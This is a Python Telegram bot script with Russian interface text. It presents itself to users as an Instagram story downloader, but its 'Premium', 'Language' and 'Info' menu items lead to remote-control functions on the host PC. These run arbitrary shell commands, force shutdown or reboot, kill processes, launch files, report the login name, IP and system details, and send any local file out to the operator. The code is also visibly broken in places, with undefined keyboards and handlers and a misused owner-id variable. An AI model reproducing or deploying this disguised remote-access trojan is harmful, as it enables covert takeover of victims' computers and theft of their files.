import telebot
import os
import time
import webbrowser
import requests
import platform
from telebot import types


bot_token = '–≤–∞—à_—Ç–æ–∫–µ–Ω'
bot = telebot.TeleBot(bot_token)
my_id = {}

user_dict = {}



menu_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=False)
btn_follow = types.KeyboardButton('–ü–æ–¥–ø–∏—Å–∫–∏ (coming  soon)')
btn_premium = types.KeyboardButton('–ü—Ä–µ–º–∏—É–º')
btn_lang = types.KeyboardButton('–Ø–∑—ã–∫')
btn_info = types.KeyboardButton('–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è')
menu_keyboard.row(btn_follow, btn_premium)
menu_keyboard.row(btn_lang, btn_info)

info_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=False)
btn_faq = types.KeyboardButton('FAQ')
btn_help = types.KeyboardButton('–ò–Ω—Å—Ç—Ä—É–∫—Ü–∏—è')
btn_channel = types.KeyboardButton('–ö–∞–Ω–∞–ª –ø—Ä–æ–µ–∫—Ç–∞')
btn_assistance = types.KeyboardButton('–ü–æ–º–æ—â—å')
btn_back = types.KeyboardButton('‚è™–ù–∞–∑–∞–¥‚è™')
info_keyboard.row(btn_faq, btn_help)
info_keyboard.row(btn_channel, btn_assistance)
info_keyboard.row(btn_back)



bot.send_message('–ü—Ä–∏–≤–µ—Ç—Å—Ç–≤—É—é!'
                 '\n'
                 '\n–Ø –ø–æ–º–æ–≥–∞—é —Å–∫–∞—á–∏–≤–∞—Ç—å –∏—Å—Ç–æ—Ä–∏–∏ –∏ –ø—É–±–ª–∏–∫–∞—Ü–∏–∏ –∏–∑ Instagram.'
                 '\n–ü—Ä–æ—Å—Ç–æ –æ—Ç–ø—Ä–∞–≤—å –º–Ω–µ –∏–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏–ª–∏ —Å—Å—ã–ª–∫—É –Ω–∞ –ø—Ä–æ—Ñ–∏–ª—å.'
                 '\n'
                 '\n–ù–∞–ø—Ä–∏–º–µ—Ä: samoylovaoxana –∏–ª–∏ https://www.instagram.com/samoylovaoxana', reply_markup=menu_keyboard)


@bot.message_handler(content_types=["text"])
def get_text_messages(message):
    if message.from_user.id == my_id:
        bot.send_chat_action(my_id, 'typing')
        if message.text == "–ü–æ–¥–ø–∏—Å–∫–∏ (coming  soon)":
            bot.send_message(my_id, "Coming soon")

        elif message.text == "–ü—Ä–µ–º–∏—É–º":
            bot.send_message(my_id, "üñ±–£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –º—ã—à–∫–æ–π", reply_markup=mouse_keyboard)
            bot.register_next_step_handler(message, mouse_process)

        elif message.text == "–Ø–∑—ã–∫":
            bot.send_message(my_id, "üìÇ–§–∞–π–ª—ã –∏ –ø—Ä–æ—Ü–µ—Å—Å—ã", reply_markup=files_keyboard)
            bot.register_next_step_handler(message, files_process)

        elif message.text == "–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è":
            bot.send_message(my_id, "‚ùáÔ∏è–î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ", reply_markup=additionals_keyboard)
            bot.register_next_step_handler(message, addons_process)

        elif message.text == "‚è™–ù–∞–∑–∞–¥‚è™":
            back(message)

        else:
            pass

    else:
        info_user(message)


def addons_process(message):
    if message.from_user.id == my_id:
        bot.send_chat_action(my_id, 'typing')
        if message.text == "üîó–ü–µ—Ä–µ–π—Ç–∏ –ø–æ —Å—Å—ã–ª–∫–µ":
            bot.send_message(my_id, "–£–∫–∞–∂–∏—Ç–µ —Å—Å—ã–ª–∫—É: ")
            bot.register_next_step_handler(message, web_process)

        elif message.text == "‚úÖ–í—ã–ø–æ–ª–Ω–∏—Ç—å –∫–æ–º–∞–Ω–¥—É":
            bot.send_message(my_id, "–£–∫–∞–∂–∏—Ç–µ –∫–æ–Ω—Å–æ–ª—å–Ω—É—é –∫–æ–º–∞–Ω–¥—É: ")
            bot.register_next_step_handler(message, cmd_process)

        elif message.text == "‚õîÔ∏è–í—ã–∫–ª—é—á–∏—Ç—å –∫–æ–º–ø—å—é—Ç–µ—Ä":
            bot.send_message(my_id, "–í—ã–∫–ª—é—á–µ–Ω–∏–µ –∫–æ–º–ø—å—é—Ç–µ—Ä–∞...")
            os.system('shutdown -s /t 0 /f')
            bot.register_next_step_handler(message, addons_process)

        elif message.text == "‚ôªÔ∏è–ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å –∫–æ–º–ø—å—é—Ç–µ—Ä":
            bot.send_message(my_id, "–ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫–∞ –∫–æ–º–ø—å—é—Ç–µ—Ä–∞...")
            os.system('shutdown -r /t 0 /f')
            bot.register_next_step_handler(message, addons_process)

        elif message.text == "üñ•–û –∫–æ–º–ø—å—é—Ç–µ—Ä–µ":
            req = requests.get('http://ip.42.pl/raw')
            ip = req.text
            uname = os.getlogin()
            windows = platform.platform()
            processor = platform.processor()
            # print(*[line.decode('cp866', 'ignore') for line in Popen('tasklist', stdout=PIPE).stdout.readlines()])
            bot.send_message(my_id, f"*–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å:* {uname}\n*IP:* {ip}\n*–û–°:* {windows}\n*–ü—Ä–æ—Ü–µ—Å—Å–æ—Ä:* {processor}",
                             parse_mode="markdown")

            bot.register_next_step_handler(message, addons_process)

        elif message.text == "‚è™–ù–∞–∑–∞–¥‚è™":
            back(message)

        else:
            pass

    else:
        info_user(message)


def back(message):
    bot.register_next_step_handler(message, get_text_messages)
    bot.send_message(my_id, "–í—ã –≤ –≥–ª–∞–≤–Ω–æ–º –º–µ–Ω—é", reply_markup=menu_keyboard)


def info_user(message):
    bot.send_chat_action(my_id, 'typing')
    alert = f"–ö—Ç–æ-—Ç–æ –ø—ã—Ç–∞–ª—Å—è –∑–∞–¥–∞—Ç—å –∫–æ–º–∞–Ω–¥—É: \"{message.text}\"\n\n"
    alert += f"user id: {str(message.from_user.id)}\n"
    alert += f"first name: {str(message.from_user.first_name)}\n"
    alert += f"last name: {str(message.from_user.last_name)}\n"
    alert += f"username: @{str(message.from_user.username)}"
    bot.send_message(my_id, alert, reply_markup=menu_keyboard)


def kill_process(message):
    bot.send_chat_action(my_id, 'typing')
    try:
        os.system("taskkill /IM " + message.text + " -F")
        bot.send_message(my_id, f"–ü—Ä–æ—Ü–µ—Å—Å \"{message.text}\" —É–±–∏—Ç", reply_markup=files_keyboard)
        bot.register_next_step_handler(message, files_process)
    except:
        bot.send_message(my_id, "–û—à–∏–±–∫–∞! –ü—Ä–æ—Ü–µ—Å—Å –Ω–µ –Ω–∞–π–¥–µ–Ω", reply_markup=files_keyboard)
        bot.register_next_step_handler(message, files_process)


def start_process(message):
    bot.send_chat_action(my_id, 'typing')
    try:
        os.startfile(r'' + message.text)
        bot.send_message(my_id, f"–§–∞–π–ª –ø–æ –ø—É—Ç–∏ \"{message.text}\" –∑–∞–ø—É—Å—Ç–∏–ª—Å—è", reply_markup=files_keyboard)
        bot.register_next_step_handler(message, files_process)
    except:
        bot.send_message(my_id, "–û—à–∏–±–∫–∞! –£–∫–∞–∑–∞–Ω –Ω–µ–≤–µ—Ä–Ω—ã–π —Ñ–∞–π–ª", reply_markup=files_keyboard)
        bot.register_next_step_handler(message, files_process)


def web_process(message):
    bot.send_chat_action(my_id, 'typing')
    try:
        webbrowser.open(message.text, new=0)
        bot.send_message(my_id, f"–ü–µ—Ä–µ—Ö–æ–¥ –ø–æ —Å—Å—ã–ª–∫–µ \"{message.text}\" –æ—Å—É—â–µ—Å—Ç–≤–ª—ë–Ω", reply_markup=additionals_keyboard)
        bot.register_next_step_handler(message, addons_process)
    except:
        bot.send_message(my_id, "–û—à–∏–±–∫–∞! —Å—Å—ã–ª–∫–∞ –≤–≤–µ–¥–µ–Ω–∞ –Ω–µ–≤–µ—Ä–Ω–æ")
        bot.register_next_step_handler(message, addons_process)


def cmd_process(message):
    bot.send_chat_action(my_id, 'typing')
    try:
        os.system(message.text)
        bot.send_message(my_id, f"–ö–æ–º–∞–Ω–¥–∞ \"{message.text}\" –≤—ã–ø–æ–ª–Ω–µ–Ω–∞", reply_markup=additionals_keyboard)
        bot.register_next_step_handler(message, addons_process)
    except:
        bot.send_message(my_id, "–û—à–∏–±–∫–∞! –ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –∫–æ–º–∞–Ω–¥–∞")
        bot.register_next_step_handler(message, addons_process)


def say_process(message):
    bot.send_chat_action(my_id, 'typing')
    bot.send_message(my_id, "–í —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–µ...", reply_markup=menu_keyboard)


def downfile_process(message):
    bot.send_chat_action(my_id, 'typing')
    try:
        file_path = message.text
        if os.path.exists(file_path):
            bot.send_message(my_id, "–§–∞–π–ª –∑–∞–≥—Ä—É–∂–∞–µ—Ç—Å—è, –ø–æ–¥–æ–∂–¥–∏—Ç–µ...")
            bot.send_chat_action(my_id, 'upload_document')
            file_doc = open(file_path, 'rb')
            bot.send_document(my_id, file_doc)
            bot.register_next_step_handler(message, files_process)
        else:
            bot.send_message(my_id, "–§–∞–π–ª –Ω–µ –Ω–∞–π–¥–µ–Ω –∏–ª–∏ —É–∫–∞–∑–∞–Ω –Ω–µ–≤–µ—Ä–Ω—ã–π –ø—É—Ç—å (–ü–†.: C:\\Documents\\File.doc)")
            bot.register_next_step_handler(message, files_process)
    except:
        bot.send_message(my_id, "–û—à–∏–±–∫–∞! –§–∞–π–ª –Ω–µ –Ω–∞–π–¥–µ–Ω –∏–ª–∏ —É–∫–∞–∑–∞–Ω –Ω–µ–≤–µ—Ä–Ω—ã–π –ø—É—Ç—å (–ü–†.: C:\\Documents\\File.doc)")
        bot.register_next_step_handler(message, files_process)


def uploadfile_process(message):
    bot.send_chat_action(my_id, 'typing')
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        src = message.document.file_name
        with open(src, 'wb') as new_file:
            new_file.write(downloaded_file)
        bot.send_message(my_id, "–§–∞–π–ª —É—Å–ø–µ—à–Ω–æ –∑–∞–≥—Ä—É–∂–µ–Ω")
        bot.register_next_step_handler(message, files_process)
    except:
        bot.send_message(my_id, "–û—à–∏–±–∫–∞! –û—Ç–ø—Ä–∞–≤—å—Ç–µ —Ñ–∞–π–ª –∫–∞–∫ –¥–æ–∫—É–º–µ–Ω—Ç")
        bot.register_next_step_handler(message, files_process)


def is_digit(string):
    if string.isdigit():
        return True
    else:
        try:
            float(string)
            return True
        except ValueError:
            return False


while True:
    try:
        bot.polling(none_stop=True, interval=0, timeout=20)
    except Exception as E:
        print(E.args)
        time.sleep(2)